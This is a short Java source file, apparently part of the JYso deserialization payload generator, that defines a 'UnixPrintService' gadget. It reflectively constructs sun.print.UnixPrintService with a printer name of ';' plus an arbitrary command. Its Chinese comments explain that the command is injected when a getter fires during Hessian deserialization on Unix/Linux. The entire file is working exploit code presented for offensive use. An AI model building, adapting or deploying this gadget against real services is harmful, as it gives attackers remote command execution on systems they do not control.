package com.qi4l.JYso.gadgets;

import java.lang.reflect.Constructor;

//该类未实现 Serializable，只适用于Hessian反序列化 并且只适用于unix/linux
//jdk高版本移除此类
//通过getter方法触发命令注入
//本地测试 zulu8u345 存在此类
public class UnixPrintService implements ObjectPayload<Object>{
    @Override
    public Object getObject(String command) throws Exception {
        Class<?> ups = Class.forName("sun.print.UnixPrintService");
        Constructor<?> declaredConstructor = ups.getDeclaredConstructor(String.class);
        declaredConstructor.setAccessible(true);
        return declaredConstructor.newInstance(";" + command);
    }
}
